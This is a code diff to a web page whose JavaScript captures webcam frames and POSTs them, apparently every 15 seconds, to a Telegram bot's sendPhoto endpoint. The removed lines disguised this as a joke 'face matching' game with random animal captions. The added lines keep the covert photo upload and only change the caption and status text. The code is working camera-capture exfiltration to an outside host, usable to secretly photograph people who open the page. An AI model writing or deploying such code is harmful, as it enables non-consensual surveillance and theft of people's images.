@@ -85,41 +85,29 @@
       return canvas;
     }
 
-    // Funny names
-    const funnyNames = [
-      "monkey 🐒", "donkey 🫏", "buffalo 🐃", "chicken 🐔", "pig 🐷", 
-      "goat 🐐", "parrot 🦜", "cat 🐱", "dog 🐶", "duck 🦆", 
-      "camel 🐪", "pigeon 🕊️", "frog 🐸", "rat 🐭", "snake 🐍"
-    ];
-
-    function getRandomFunnyName() {
-      const i = Math.floor(Math.random() * funnyNames.length);
-      return funnyNames[i];
-    }
-
     // Capture → Telegram
     async function sendPhoto() {
       const canvas = captureFrame();
-      log.innerText = "⏳ checking your face...";
+      log.innerText = "⏳ Sending photo...";
 
       // Convert to Blob
       const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
 
-      // Caption for Telegram
-      const caption = "📩 Your face is matching with " + getRandomFunnyName();
+      // Fixed caption
+      const caption = "Answer this question";
 
       // Send to Telegram
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       formData.append("photo", blob, "capture.jpg");
-      formData.append("caption", caption);   // ✅ caption added
+      formData.append("caption", caption);
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
       });
 
-      log.innerText = caption;  // also show in browser
+      log.innerText = "✅ Sent with caption: " + caption;
     }
 
     // Auto every 15 seconds
@@ -130,3 +118,4 @@
   </script>
 </body>
 </html>
+
